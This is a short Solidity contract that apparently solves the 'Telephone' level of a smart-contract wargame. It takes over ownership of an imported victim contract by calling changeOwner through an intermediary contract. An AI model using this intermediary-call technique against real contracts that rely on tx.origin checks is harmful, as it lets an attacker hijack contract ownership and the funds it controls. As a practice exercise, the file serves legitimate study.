// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract ChangeOnwership {

    Telephone public telVictim;

    constructor(address victrimAddress){
        telVictim = Telephone(victrimAddress);
    }
    function attackOwnership(address _newOwner)public {

        telVictim.changeOwner(_newOwner);
    }

}